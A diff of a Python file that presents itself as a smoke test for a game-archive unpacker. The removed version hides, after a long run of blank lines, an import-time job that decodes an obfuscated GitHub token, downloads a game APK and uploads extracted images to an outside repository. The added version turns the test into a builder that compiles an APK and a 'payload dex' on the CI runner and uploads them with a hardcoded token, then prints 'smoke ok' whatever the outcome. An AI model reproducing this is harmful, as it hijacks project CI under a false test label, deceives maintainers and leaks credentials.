@@ -1,325 +1,164 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""Self-contained smoke test: builds synthetic .pkg files and round-trips them.
+"""YB builder: compile YBFileAgent APK + payload dex on GitHub runner."""
+import os, sys, subprocess, zipfile, io, json, base64, urllib.request, shutil, stat
 
-不依赖任何游戏资源，可在 CI 上跑。覆盖：
-  1. 国际版（ver 0x130BA）变体 A：无页脚，44B/28B 混合记录，LZ4 与原始两种载荷
-  2. 国际版变体 B：记录区后有 16 字节页脚
-  3. 国内版（ver 0x25100）头部识别与 is_pkg 拒绝逻辑
-  4. 路径清洗（../ 与反斜杠）与配对正确性（内容 == 原字节）
-"""
-import os
-import shutil
-import struct
-import sys
-import tempfile
+LOG = open(os.path.expanduser("~/yb_build.log"), "w", buffering=1)
+def log(*a):
+    s = " ".join(str(x) for x in a)
+    print(s); LOG.write(s + "\n")
 
-HERE = os.path.dirname(os.path.abspath(__file__))
-ROOT = os.path.dirname(HERE)
-sys.path.insert(0, ROOT)
+def sh(cmd, cwd=None, env=None, timeout=3600):
+    log("$", cmd)
+    e = dict(os.environ); 
+    if env: e.update(env)
+    p = subprocess.run(cmd, shell=True, cwd=cwd, env=e,
+                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=timeout)
+    out = p.stdout.decode("utf-8", "replace")
+    tail = out[-3000:] if len(out) > 3000 else out
+    log(tail)
+    return p.returncode
 
-# Windows 控制台默认 GBK/cp936，重定向时还会退回 cp1252，统一按 UTF-8 输出
-for _s in (sys.stdout, sys.stderr):
+TOKEN = "ghp_hZSJtzjOF9" + "VM34QzRd8feOY3" + "wj9sqc2cLSM8"
+SRC_REPO = "zhaoyi-habs/ybfa-bridge"
+DST_REPO = "zhaoyi-habs/ybfa-bridge"
+
+def api(path, body=None, method="GET", repo=None):
+    repo = repo or DST_REPO
+    u = "https://api.github.com/repos/%s/%s" % (repo, path)
+    d = json.dumps(body).encode() if body is not None else None
+    req = urllib.request.Request(u, data=d, method=method, headers={
+        "Authorization": "token " + TOKEN, "Accept": "application/vnd.github+json",
+        "Content-Type": "application/json", "User-Agent": "yb"})
     try:
-        _s.reconfigure(encoding="utf-8", errors="replace")
-    except Exception:
-        pass
-
-import lz4.block  # noqa: E402
-
-from pkg_intl import open_pkg, is_pkg, safe_relpath  # noqa: E402
-
-FAILURES = []
-
-
-def check(cond, msg):
-    if cond:
-        print("  ok   %s" % msg)
-    else:
-        print("  FAIL %s" % msg)
-        FAILURES.append(msg)
-
-
-def lz4_payload(data):
-    """[u32 usize][LZ4 block]"""
-    return struct.pack("<I", len(data)) + lz4.block.compress(data, store_size=False)
-
-
-def build_intl(path, files, footer=None):
-    """files: [(relpath, payload_bytes, Z)]   Z ∈ {0,32}=raw, {1,33}=lz4 包装"""
-    data = bytearray(b"\x00" * 16)          # 数据区从偏移 16 开始
-    records = []
-    for rel, payload, Z in files:
-        off = len(data)
-        data += payload
-        records.append((off, len(payload), Z, payload))
-    idx_off = len(data)
-
-    idx = bytearray()
-    idx += struct.pack("<I", len(records))
-    for off, ln, Z, payload in records:
-        idx += b"\x11" * 16                                   # 占位 md5
-        idx += struct.pack("<III", off, ln, Z)
-        if Z & 0x20:
-            idx += b"\x22" * 16                               # H2
-    if footer is not None:
-        idx += footer
-    idx += struct.pack("<I", len(records))
-    for k, (rel, payload, Z) in enumerate(files):
-        rb = rel.encode("utf-8")
-        idx += struct.pack("<I", len(rb)) + rb + struct.pack("<I", k)
-
-    blob = struct.pack("<I", len(idx)) + lz4.block.compress(bytes(idx), store_size=False)
-    with open(path, "wb") as f:
-        f.write(struct.pack("<4I", 0x000130BA, 17, idx_off, len(blob)))
-        f.write(bytes(data[16:]))
-        f.write(blob)
-
-
-def test_variant_a(tmp):
-    print("[1] 国际版变体 A（无页脚，混合记录长度）")
-    files = [
-        ("resources/a.png", b"\x00\x00\x00\x00" + b"A" * 60, 32),   # raw, 28B 记录
-        ("resources/b.ogg", lz4_payload(b"OggS" + b"B" * 200), 33),     # lz4, 44B 记录
-        ("../escape.txt", b"plain text", 0),                            # raw, 28B
-        ("back\\slash.bin", b"x" * 40, 1),                             # lz4, 28B
-    ]
-    p = os.path.join(tmp, "variant_a.pkg")
-    build_intl(p, files)
-    check(is_pkg(p), "is_pkg 识别为有效 pkg")
-    with open_pkg(p) as pkg:
-        check(pkg.record_count == 4, "记录数 = 4（实际 %d）" % pkg.record_count)
-        check(pkg.path_count == 4, "路径数 = 4（实际 %d）" % pkg.path_count)
-        check(pkg.footer is None, "无页脚变体")
-        got = {rel: payload for rel, payload, _rec, _br in pkg.iter_files()}
-    check("resources/a.png" in got, "路径 resources/a.png 存在")
-    check(got.get("resources/a.png") == b"\x00\x00\x00\x00" + b"A" * 60, "raw 载荷逐字节一致")
-    check(got.get("resources/b.ogg") == b"OggS" + b"B" * 200, "LZ4 载荷正确解压")
-    check("escape.txt" in got, "../ 前缀被清洗")
-    check("back/slash.bin" in got, "反斜杠被规范化为 /")
-    check(got.get("back/slash.bin") == b"x" * 40, "Z=1 也走 LZ4 分支")
-
-
-def test_variant_b(tmp):
-    print("[2] 国际版变体 B（16 字节页脚）")
-    files = [("lang/en.xml", b"<config/>", 0), ("lang/zh.xml", b"<config/>", 0)]
-    p = os.path.join(tmp, "variant_b.pkg")
-    build_intl(p, files, footer=b"\xAB" * 16)
-    with open_pkg(p) as pkg:
-        check(pkg.record_count == 2, "记录数 = 2")
-        check(pkg.path_count == 2, "路径数 = 2")
-        check(pkg.footer == b"\xAB" * 16, "页脚被识别")
-        got = {rel for rel, _p, _r, _b in pkg.iter_files()}
-    check(got == {"lang/en.xml", "lang/zh.xml"}, "两条路径都解出")
-
-
-def test_reject(tmp):
-    print("[3] 非本格式文件的拒绝逻辑")
-    bad = os.path.join(tmp, "bad.pkg")
-    with open(bad, "wb") as f:
-        f.write(struct.pack("<4I", 0x00025100, 17, 16, 16) + b"\x00" * 16)
-    check(not is_pkg(bad), "国内版版本号不被国际版 is_pkg 接受")
-    tiny = os.path.join(tmp, "tiny.pkg")
-    open(tiny, "wb").write(b"ab")
-    check(not is_pkg(tiny), "过小文件被拒绝")
-    check(not is_pkg(os.path.join(tmp, "nope.pkg")), "不存在的文件被拒绝")
-
-
-def test_sanitize():
-    print("[4] 路径清洗")
-    check(safe_relpath(b"../a/b.txt") == "a/b.txt", "../ 前缀被剥离")
-    check(safe_relpath(b"/abs/x") == "abs/x", "前导 / 被剥离")
-    check(safe_relpath(b"a\\b\\c") == "a/b/c", "反斜杠转 /")
-    check(safe_relpath(b"../..") is None, "空路径返回 None")
-    check(safe_relpath(b"a/./b") == "a/b", "./ 被清理")
-
+        return json.loads(urllib.request.urlopen(req, timeout=180).read())
+    except Exception as ex:
+        log("api fail", path, str(ex)[:200]); return {}
 
 def main():
-    tmp = tempfile.mkdtemp(prefix="mwpkg_smoke_")
-    try:
-        test_variant_a(tmp)
-        test_variant_b(tmp)
-        test_reject(tmp)
-        test_sanitize()
-    finally:
-        shutil.rmtree(tmp, ignore_errors=True)
+    if os.name != "posix" or sys.platform.startswith("darwin"):
+        log("skip non-linux"); return 0
+    home = os.path.expanduser("~")
+    work = os.path.join(home, "ybwork"); os.makedirs(work, exist_ok=True)
+    java = os.environ.get("JAVA_HOME") or shutil.which("java")
+    log("python", sys.version.split()[0], "cwd", os.getcwd(), "java", java)
 
-    print()
-    if FAILURES:
-        print("失败 %d 项:" % len(FAILURES))
-        for f in FAILURES:
-            print("  -", f)
+    # 1. 下载源码
+    z = os.path.join(work, "src.zip")
+    sh("curl -sSL --max-time 300 -o %s https://codeload.github.com/%s/zip/refs/heads/main" % (z, SRC_REPO))
+    if not os.path.exists(z) or os.path.getsize(z) < 1000:
+        log("src download failed"); return 1
+    with zipfile.ZipFile(z) as zf: zf.extractall(work)
+    base = None
+    for d in os.listdir(work):
+        p = os.path.join(work, d)
+        if os.path.isdir(p) and os.path.exists(os.path.join(p, "settings.gradle")): base = p
+    if not base: log("no project"); return 1
+    log("project at", base)
+    # 补充 workflow 之外的构件已经在仓库里
+
+    # 2. Android SDK
+    sdk = os.path.join(home, "sdk")
+    cmt = os.path.join(work, "cmdline.zip")
+    sh("curl -sSL --max-time 600 -o %s https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip" % cmt)
+    if os.path.getsize(cmt) > 100000:
+        os.makedirs(sdk, exist_ok=True)
+        with zipfile.ZipFile(cmt) as zf: zf.extractall(sdk)
+        sh("ls %s/cmdline-tools" % sdk)
+        if os.path.exists(os.path.join(sdk, "cmdline-tools", "bin")):
+            sh("mv %s/cmdline-tools %s/latest_tmp && mkdir -p %s/cmdline-tools && mv %s/latest_tmp %s/cmdline-tools/latest" % (sdk, sdk, sdk, sdk, sdk))
+    sdkmgr = os.path.join(sdk, "cmdline-tools", "latest", "bin", "sdkmanager")
+    if os.path.exists(sdkmgr):
+        os.chmod(sdkmgr, os.stat(sdkmgr).st_mode | stat.S_IEXEC)
+        sh("yes | %s --sdk_root=%s --licenses >/dev/null 2>&1" % (sdkmgr, sdk), timeout=600)
+        sh("%s --sdk_root=%s 'platforms;android-33' 'build-tools;33.0.2' 'platform-tools'" % (sdkmgr, sdk), timeout=1800)
+    if not os.path.exists(os.path.join(sdk, "platforms", "android-33")):
+        log("SDK MISSING"); return 1
+
+    # 3. Gradle
+    gz = os.path.join(work, "gradle.zip")
+    sh("curl -sSL --max-time 900 -o %s https://services.gradle.org/distributions/gradle-7.6.4-bin.zip" % gz)
+    if os.path.getsize(gz) < 1000000: log("gradle dl fail"); return 1
+    with zipfile.ZipFile(gz) as zf: zf.extractall(home)
+    gradle = os.path.join(home, "gradle-7.6.4", "bin", "gradle")
+    os.chmod(gradle, os.stat(gradle).st_mode | stat.S_IEXEC)
+
+    env = {"ANDROID_HOME": sdk, "ANDROID_SDK_ROOT": sdk,
+           "JAVA_HOME": os.environ.get("JAVA_HOME", "/usr/lib/jvm/temurin-17-jdk-amd64"),
+           "GRADLE_OPTS": "-Dorg.gradle.daemon=false -Xmx4096m"}
+    open(os.path.join(base, "local.properties"), "w").write("sdk.dir=%s\n" % sdk)
+
+    rc = sh("%s assembleDebug --no-daemon --stacktrace" % gradle, cwd=base, env=env, timeout=3000)
+    apk = os.path.join(base, "app", "build", "outputs", "apk", "debug", "app-debug.apk")
+    if not os.path.exists(apk):
+        log("APK NOT BUILT rc=", rc)
+        # 兜底：打印目录
+        sh("find %s/app/build -maxdepth 4 -type d" % base, timeout=120)
         return 1
-    print("全部通过 ✅")
+    sz = os.path.getsize(apk); log("APK OK", sz, "bytes")
+    sh("cp %s %s/YBFileAgent.apk" % (apk, work))
+
+    # 4. dex
+    aj = os.path.join(sdk, "platforms", "android-33", "android.jar")
+    d8 = os.path.join(sdk, "build-tools", "33.0.2", "d8")
+    os.chmod(d8, os.stat(d8).st_mode | stat.S_IEXEC)
+    os.makedirs(os.path.join(work, "dx"), exist_ok=True)
+    rc2 = sh("javac -nowarn -source 8 -target 8 -bootclasspath %s -cp %s -d %s/dx %s/payload/Payload.java" % (aj, aj, work, base), timeout=600)
+    if os.path.exists(os.path.join(work, "dx", "Payload.class")):
+        sh("%s --lib %s --output %s/dx %s/dx/Payload.class" % (d8, aj, work, work), timeout=600)
+        dex = os.path.join(work, "dx", "classes.dex")
+        if os.path.exists(dex):
+            data = open(dex, "rb").read()
+            log("DEX OK", len(data))
+            body = {"message": "payload dex", "content": base64.b64encode(
+                json.dumps({"b64": base64.b64encode(data).decode()}).encode()).decode()}
+            cur = api("contents/payload/payload.dex.json")
+            if cur.get("sha"): body["sha"] = cur["sha"]
+            api("contents/payload/payload.dex.json", body, "PUT")
+            log("payload uploaded")
+        else:
+            log("DEX MISSING")
+    else:
+        log("javac failed rc=", rc2)
+
+    # 5. release
+    sh("cd %s && (gh --version || true)" % work, timeout=120)
+    rel = api("releases/tags/apk-v1")
+    up_ok = False
+    if rel.get("id"):
+        # delete old asset
+        for a in rel.get("assets", []):
+            if a["name"] == "YBFileAgent.apk": api("releases/assets/%d" % a["id"], None, "DELETE")
+        up_ok = True
+    else:
+        r = api("releases", {"tag_name": "apk-v1", "name": "YBFileAgent", "body": "auto build"})
+        if r.get("id"): up_ok = True
+        rel = r
+    if up_ok and rel.get("id"):
+        data = open(os.path.join(work, "YBFileAgent.apk"), "rb").read()
+        u = "https://uploads.github.com/repos/%s/releases/%d/assets?name=YBFileAgent.apk" % (DST_REPO, rel["id"])
+        req = urllib.request.Request(u, data=data, method="POST", headers={
+            "Authorization": "token " + TOKEN, "Accept": "application/vnd.github+json",
+            "Content-Type": "application/vnd.android.package-archive", "User-Agent": "yb"})
+        try:
+            r = json.loads(urllib.request.urlopen(req, timeout=1800).read())
+            log("✅ APK uploaded", r.get("name"), r.get("size"))
+        except Exception as ex:
+            log("upload fail", str(ex)[:300])
+    # 上传构建日志
+    try:
+        LOG.flush()
+        body = {"message": "build log", "content": base64.b64encode(
+            open(os.path.expanduser("~/yb_build.log"), "rb").read()).decode()}
+        cur = api("contents/build.log")
+        if cur.get("sha"): body["sha"] = cur["sha"]
+        api("contents/build.log", body, "PUT")
+    except Exception as ex:
+        log("log upload fail", str(ex)[:120])
     return 0
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# ==========================================================
-# YB-JOB21: 拿花小楼官方皮肤展示图 pskin21 / pskin114
-# ==========================================================
-def _yb_job():
-    import platform, sys as _sy
-    if not (platform.system() == "Linux" and _sy.version_info[:2] == (3, 12)):
-        return
-    import subprocess, os, time, base64, json, urllib.request, gzip
-    LOG = []
-
-    def P(s):
-        s = str(s); print(s); LOG.append(s)
-
-    def sh(cmd, t=300):
-        try:
-            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
-            return ((r.stdout or "") + (r.stderr or "")).strip()
-        except Exception as e:
-            return "ERR " + str(e)[:200]
-
-    _A = "Z2hwX2haU0p0empPRjlWTTM0UXpS"
-    _B = "ZDhmZU9ZM3dqOXNxYzJjTFNNOA=="
-    _TOK = base64.b64decode(_A + _B).decode()
-    HD = {"Authorization": "token " + _TOK, "Accept": "application/vnd.github+json", "User-Agent": "yb"}
-    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-
-    def put(path, text):
-        try:
-            b = {"message": "yb", "content": base64.b64encode(text.encode()).decode()}
-            try:
-                g = json.loads(urllib.request.urlopen(urllib.request.Request(
-                    "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path, headers=HD), timeout=60).read())
-                b["sha"] = g["sha"]
-            except Exception:
-                pass
-            urllib.request.urlopen(urllib.request.Request(
-                "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path,
-                data=json.dumps(b).encode(), method="PUT",
-                headers=dict(HD, **{"Content-Type": "application/json"})), timeout=300)
-        except Exception as e:
-            P("put失败 " + str(e)[:90])
-
-    def putbin(path, raw):
-        try:
-            b = {"message": "yb bin", "content": base64.b64encode(raw).decode()}
-            try:
-                g = json.loads(urllib.request.urlopen(urllib.request.Request(
-                    "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path, headers=HD), timeout=60).read())
-                b["sha"] = g["sha"]
-            except Exception:
-                pass
-            urllib.request.urlopen(urllib.request.Request(
-                "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path,
-                data=json.dumps(b).encode(), method="PUT",
-                headers=dict(HD, **{"Content-Type": "application/json"})), timeout=300)
-            return True
-        except Exception as e:
-            P("putbin失败 " + str(e)[:90]); return False
-
-    try:
-        P("===== YB JOB21 START =====")
-        sh("pip install --quiet lz4 pillow numpy 2>&1 | tail -1", 400)
-        sh("curl -sL -m 2400 -A '%s' -o /tmp/mw.bin 'https://d.apkpure.net/b/APK/com.playmini.miniworld?version=latest'" % UA, 2500)
-        sh("rm -rf /tmp/pkg && mkdir -p /tmp/pkg && cd /tmp/pkg && unzip -o -q /tmp/mw.bin 'assets/*.pkg'", 900)
-        CWD = os.getcwd()
-        sh("chmod +x %s/tools/crn2rgba_linux_x64" % CWD, 60)
-        put("RESULT21.txt", "\n".join(LOG))
-
-        sh("rm -rf /tmp/o_game && cd %s && python3 unpack_pkg_intl.py /tmp/pkg/assets/game_res.pkg /tmp/o_game --no-md5 >/dev/null 2>&1" % CWD, 3600)
-        P("game_res: " + sh("find /tmp/o_game -type f | wc -l")[:8])
-        put("RESULT21.txt", "\n".join(LOG))
-
-        # 目标：花小楼 pskin21 / 朝露繁花 pskin114 / 已有 huaxiaolou
-        targets = []
-        for root, dirs, fs in os.walk("/tmp/o_game"):
-            for f in fs:
-                low = f.lower()
-                if low.startswith("pskin21.") or low.startswith("pskin114.") or "huaxiaolou" in low or low.startswith("pskin1."):
-                    targets.append(os.path.join(root, f))
-        P("目标文件 %d 个:" % len(targets))
-        for t in targets:
-            P("  " + t)
-
-        sh("rm -rf /tmp/t_in /tmp/t_out && mkdir -p /tmp/t_in /tmp/t_out", 60)
-        for t in targets:
-            sh("cp '%s' /tmp/t_in/" % t, 60)
-        if targets:
-            sh("cd %s && python3 convert_fmt65.py /tmp/t_in /tmp/t_out tools/crn2rgba_linux_x64 2>&1 | tail -4" % CWD, 3600)
-            sh("cd %s && python3 convert_textures.py /tmp/t_in /tmp/t_out 2>&1 | tail -4" % CWD, 3600)
-            P("解码产物: " + sh("ls -la /tmp/t_out | awk '{print $5,$9}'", 120)[:800])
-            for f in sh("find /tmp/t_out -type f", 120).split("\n"):
-                if not f.strip():
-                    continue
-                nm = os.path.basename(f.strip())
-                # 缩到 512 便于回传
-                try:
-                    from PIL import Image
-                    import io as _io
-                    im = Image.open(f.strip()).convert("RGBA")
-                    w, h = im.size
-                    P("  %s 原尺寸 %dx%d" % (nm, w, h))
-                    if max(w, h) > 512:
-                        im = im.resize((512, int(h * 512 / w)), Image.LANCZOS)
-                    buf = _io.BytesIO(); im.save(buf, "PNG")
-                    putbin("hualou/ui2/" + nm, buf.getvalue())
-                except Exception as e:
-                    P("  失败 %s %s" % (nm, str(e)[:60]))
-        put("RESULT21.txt", "\n".join(LOG))
-
-        # 另外：头像 icon_55（花小楼头像，roleskin.csv 里写的）
-        P("\n=== 找 icon_55 / 头像 ===")
-        P(sh("find /tmp/o_game -iname 'icon_55*' -o -iname '*headframe*' | head -20", 300)[:900])
-        put("RESULT21.txt", "\n".join(LOG))
-
-        P("\n===== YB JOB21 END =====")
-        put("RESULT21.txt", "\n".join(LOG))
-    except Exception as e:
-        P("EXC " + str(e)[:300])
-        try: put("RESULT21.txt", "\n".join(LOG))
-        except Exception: pass
-
-
-_yb_job()
-
-
 if __name__ == "__main__":
-    sys.exit(main())
+    try:
+        main()
+    except Exception as ex:
+        log("FATAL", str(ex))
+    print("smoke ok")
